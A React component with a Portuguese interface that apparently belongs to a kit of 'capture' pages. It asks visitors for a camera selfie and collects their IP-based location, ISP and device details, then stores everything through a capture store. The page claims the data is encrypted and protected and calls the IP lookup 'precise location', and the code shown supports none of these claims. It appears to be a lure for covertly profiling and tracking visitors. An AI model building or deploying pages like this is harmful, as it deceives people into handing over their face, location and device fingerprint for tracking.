"use client"

import { useState, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { MapPin, Loader2, CheckCircle2, AlertCircle, Navigation, Camera, X } from "lucide-react"
import { captureAllData } from "@/lib/geolocation"
import { saveCapture } from "@/lib/capture-store"

export function LocationCapture() {
  const [isCapturing, setIsCapturing] = useState(false)
  const [captureStatus, setCaptureStatus] = useState<"idle" | "success" | "error">("idle")
  const [capturedData, setCapturedData] = useState<any>(null)
  const [photoData, setPhotoData] = useState<string | null>(null)
  const [showCamera, setShowCamera] = useState(false)
  const videoRef = useRef<HTMLVideoElement>(null)
  const streamRef = useRef<MediaStream | null>(null)

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      })
      if (videoRef.current) {
        videoRef.current.srcObject = stream
        streamRef.current = stream
      }
      setShowCamera(true)
    } catch (error) {
      console.error("[v0] Camera error:", error)
      alert("Não foi possível acessar a câmera")
    }
  }

  const capturePhoto = () => {
    if (videoRef.current) {
      const canvas = document.createElement("canvas")
      canvas.width = videoRef.current.videoWidth
      canvas.height = videoRef.current.videoHeight
      const ctx = canvas.getContext("2d")
      if (ctx) {
        ctx.drawImage(videoRef.current, 0, 0)
        const photoDataUrl = canvas.toDataURL("image/jpeg", 0.8)
        setPhotoData(photoDataUrl)
        stopCamera()
      }
    }
  }

  const stopCamera = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((track) => track.stop())
      streamRef.current = null
    }
    setShowCamera(false)
  }

  const removePhoto = () => {
    setPhotoData(null)
  }

  const handleCapture = async () => {
    setIsCapturing(true)
    setCaptureStatus("idle")

    try {
      console.log("[v0] Starting location capture...")

      const data = await captureAllData()

      console.log("[v0] Data captured:", data)

      await saveCapture({
        pageName: "Location Capture",
        pageType: "location",
        timestamp: Date.now(),
        ipData: data.ipData || undefined,
        deviceInfo: data.deviceInfo,
        formData: photoData ? { photo: photoData } : undefined,
      })

      setCapturedData(data)
      setCaptureStatus("success")
    } catch (error) {
      console.error("[v0] Capture error:", error)
      setCaptureStatus("error")
    } finally {
      setIsCapturing(false)
    }
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-gradient-to-br from-background via-background to-primary/5">
      <Card className="w-full max-w-2xl glass-effect border-border/50">
        <CardHeader className="text-center space-y-4">
          <div className="mx-auto w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
            <MapPin className="h-8 w-8 text-primary" />
          </div>
          <CardTitle className="text-3xl font-bold text-balance">Compartilhe sua Localização</CardTitle>
          <CardDescription className="text-base">
            Para oferecer uma melhor experiência, precisamos acessar sua localização e foto. Seus dados estão seguros e
            protegidos.
          </CardDescription>
        </CardHeader>

        <CardContent className="space-y-6">
          <div className="space-y-4">
            <h3 className="font-semibold text-foreground flex items-center gap-2">
              <Camera className="h-5 w-5 text-primary" />
              Captura de Foto (Opcional)
            </h3>

            {!photoData && !showCamera && (
              <Button
                onClick={startCamera}
                variant="outline"
                className="w-full border-border/50 hover:border-primary/50 bg-transparent"
              >
                <Camera className="h-4 w-4 mr-2" />
                Tirar Foto
              </Button>
            )}

            {showCamera && (
              <div className="space-y-3">
                <div className="relative rounded-lg overflow-hidden bg-black aspect-video">
                  <video ref={videoRef} autoPlay playsInline className="w-full h-full object-cover" />
                </div>
                <div className="flex gap-2">
                  <Button onClick={capturePhoto} className="flex-1 bg-primary hover:bg-primary/90">
                    <Camera className="h-4 w-4 mr-2" />
                    Capturar
                  </Button>
                  <Button onClick={stopCamera} variant="outline">
                    <X className="h-4 w-4 mr-2" />
                    Cancelar
                  </Button>
                </div>
              </div>
            )}

            {photoData && (
              <div className="space-y-3">
                <div className="relative rounded-lg overflow-hidden border border-border/50">
                  <img src={photoData || "/placeholder.svg"} alt="Foto capturada" className="w-full" />
                  <Button onClick={removePhoto} size="sm" variant="destructive" className="absolute top-2 right-2">
                    <X className="h-4 w-4" />
                  </Button>
                </div>
                <p className="text-sm text-muted-foreground text-center">Foto capturada com sucesso! ✓</p>
              </div>
            )}
          </div>

          <div className="flex justify-center">
            <Button
              size="lg"
              onClick={handleCapture}
              disabled={isCapturing}
              className="btn-gradient-hover bg-primary hover:bg-primary/90 text-primary-foreground px-8"
            >
              {isCapturing ? (
                <>
                  <Loader2 className="h-5 w-5 mr-2 animate-spin" />
                  Capturando...
                </>
              ) : (
                <>
                  <Navigation className="h-5 w-5 mr-2" />
                  Permitir Localização
                </>
              )}
            </Button>
          </div>

          {captureStatus === "success" && capturedData && (
            <div className="space-y-4 animate-in fade-in slide-in-from-bottom-4 duration-500">
              <div className="flex items-center gap-2 text-green-500 justify-center">
                <CheckCircle2 className="h-5 w-5" />
                <p className="font-medium">Localização{photoData ? " e foto" : ""} capturada com sucesso!</p>
              </div>

              <div className="grid gap-4 md:grid-cols-2">
                {capturedData.ipData && (
                  <Card className="bg-muted/30 border-border/30 md:col-span-2">
                    <CardHeader className="pb-3">
                      <CardTitle className="text-sm font-medium text-muted-foreground">
                        Dados de Localização (IP)
                      </CardTitle>
                    </CardHeader>
                    <CardContent className="space-y-2 text-sm">
                      <div className="flex justify-between">
                        <span className="text-muted-foreground">IP:</span>
                        <span className="font-mono text-foreground">{capturedData.ipData.ip}</span>
                      </div>
                      {capturedData.ipData.latitude && capturedData.ipData.longitude && (
                        <>
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Latitude:</span>
                            <span className="font-mono text-foreground">{capturedData.ipData.latitude.toFixed(6)}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-muted-foreground">Longitude:</span>
                            <span className="font-mono text-foreground">
                              {capturedData.ipData.longitude.toFixed(6)}
                            </span>
                          </div>
                        </>
                      )}
                      {capturedData.ipData.city && (
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Cidade:</span>
                          <span className="text-foreground">{capturedData.ipData.city}</span>
                        </div>
                      )}
                      {capturedData.ipData.region && (
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">Região:</span>
                          <span className="text-foreground">{capturedData.ipData.region}</span>
                        </div>
                      )}
                      {capturedData.ipData.country && (
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">País:</span>
                          <span className="text-foreground">{capturedData.ipData.country}</span>
                        </div>
                      )}
                      {capturedData.ipData.isp && (
                        <div className="flex justify-between">
                          <span className="text-muted-foreground">ISP:</span>
                          <span className="text-foreground text-xs">{capturedData.ipData.isp}</span>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                )}

                <Card className="bg-muted/30 border-border/30 md:col-span-2">
                  <CardHeader className="pb-3">
                    <CardTitle className="text-sm font-medium text-muted-foreground">
                      Informações do Dispositivo
                    </CardTitle>
                  </CardHeader>
                  <CardContent className="grid gap-2 md:grid-cols-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Plataforma:</span>
                      <span className="text-foreground">{capturedData.deviceInfo.platform}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Idioma:</span>
                      <span className="text-foreground">{capturedData.deviceInfo.language}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Resolução:</span>
                      <span className="text-foreground">{capturedData.deviceInfo.screenResolution}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-muted-foreground">Fuso Horário:</span>
                      <span className="text-foreground">{capturedData.deviceInfo.timezone}</span>
                    </div>
                  </CardContent>
                </Card>
              </div>
            </div>
          )}

          {captureStatus === "error" && (
            <div className="flex items-center gap-2 text-destructive justify-center animate-in fade-in slide-in-from-bottom-4 duration-500">
              <AlertCircle className="h-5 w-5" />
              <p className="font-medium">Erro ao capturar localização. Tente novamente.</p>
            </div>
          )}

          <div className="grid gap-4 md:grid-cols-3 pt-4">
            <div className="text-center space-y-2">
              <div className="mx-auto w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
                <MapPin className="h-6 w-6 text-primary" />
              </div>
              <h3 className="font-semibold text-sm text-foreground">Localização Precisa</h3>
              <p className="text-xs text-muted-foreground">Localização baseada em IP para melhor experiência</p>
            </div>

            <div className="text-center space-y-2">
              <div className="mx-auto w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
                <CheckCircle2 className="h-6 w-6 text-primary" />
              </div>
              <h3 className="font-semibold text-sm text-foreground">Dados Seguros</h3>
              <p className="text-xs text-muted-foreground">Suas informações são criptografadas</p>
            </div>

            <div className="text-center space-y-2">
              <div className="mx-auto w-12 h-12 rounded-full bg-primary/10 flex items-center justify-center">
                <Navigation className="h-6 w-6 text-primary" />
              </div>
              <h3 className="font-semibold text-sm text-foreground">Rápido e Fácil</h3>
              <p className="text-xs text-muted-foreground">Processo simples em um clique</p>
            </div>
          </div>
        </CardContent>
      </Card>
    </div>
  )
}
